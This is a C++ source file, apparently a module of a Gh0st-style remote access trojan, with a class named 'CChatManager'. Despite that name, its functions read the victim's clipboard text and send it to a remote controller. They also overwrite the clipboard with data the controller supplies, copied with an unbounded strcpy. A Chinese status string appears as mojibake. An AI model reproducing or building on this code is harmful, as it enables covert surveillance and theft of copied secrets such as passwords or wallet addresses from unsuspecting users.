#include "../StdAfx.h"
#include "../MyFunc.h"
#include "ChatManager.h"

CChatManager::CChatManager(CClientSocket *pClient) : CManager(pClient)
{
	BYTE	bToken[2];
	bToken[0] = TOKEN_CHAT_START;
	bToken[1] = (BYTE)true;
	Send((LPBYTE)&bToken[0], sizeof(bToken));	
	WaitForDialogOpen();
}

void CChatManager::SendBoradData()
{
	if (m_gFunc.OpenClipboard(NULL) )
	{
		HANDLE hData = m_gFunc.GetClipboardData(CF_TEXT);
		char * buffer = (char*)m_gFunc.GlobalLock(hData);
		
		if (buffer == NULL)
		{
			char str[] = "¼ôÇÐ°åÊý¾ÝÎª¿Õ";

			Send((unsigned char *)str,m_gFunc.strlen(str));	
		}
		else
		{
			Send((unsigned char *)buffer,m_gFunc.strlen(buffer));
		}

		m_gFunc.GlobalUnlock(hData);
		m_gFunc.CloseClipboard();
	}
}


void CChatManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	if (lpBuffer[0] == COMMAND_CHAT_CLOSE)
	{
		SendBoradData();
		return;
	}
	if( OpenClipboard(NULL) )
	{
		HGLOBAL clipbuffer;
		char * buffer;
		m_gFunc.EmptyClipboard();
		clipbuffer = m_gFunc.GlobalAlloc(GMEM_DDESHARE, nSize+1);
		buffer = (char*)m_gFunc.GlobalLock(clipbuffer);
		strcpy(buffer, LPCSTR(lpBuffer));
		m_gFunc.GlobalUnlock(clipbuffer);
		m_gFunc.SetClipboardData(CF_TEXT,clipbuffer);
		m_gFunc.CloseClipboard();
	}
}